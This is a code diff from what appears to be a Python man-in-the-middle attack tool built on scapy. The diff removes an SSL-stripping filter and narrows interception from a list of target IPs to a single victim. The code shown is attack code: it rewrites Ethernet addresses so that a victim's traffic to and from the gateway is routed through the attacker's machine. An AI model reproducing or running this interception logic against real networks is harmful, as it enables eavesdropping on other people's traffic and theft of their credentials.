@@ -11,7 +11,6 @@ import threading
 from scapy.layers.inet import IP, TCP, UDP
 from scapy.layers.inet6 import IPv6
 from scapy.layers.l2 import Ether
-from SSLFilter import SSLStripFilter
 
 class MitmHandler:
 
@@ -28,7 +27,6 @@ class MitmHandler:
         self.running = False
         self.logger = logger
         self.filters = []
-        self.add_filter(SSLStripFilter(self.victim_ip, self.logger))
 
     def add_filter(self, filter_handler):
         self.filters.append(filter_handler)
@@ -128,14 +126,14 @@ class MitmHandler:
             forwarded = False
 
             # From victim to gateway
-            if src_ip in self.target_ips:
+            if src_ip == self.victim_ip:
                 # Pretend that we sent the packet, and send it to the gateway
                 pkt[Ether].dst = self.gateway_mac
                 pkt[Ether].src = self.attacker_mac
                 forwarded = True
 
             # From gateway to the victim
-            elif dst_ip in self.target_ips:
+            elif dst_ip == self.victim_ip:
                 # Pretend that we sent the packet, and send it to the victim
                 pkt[Ether].dst = self.victim_mac
                 pkt[Ether].src = self.attacker_mac
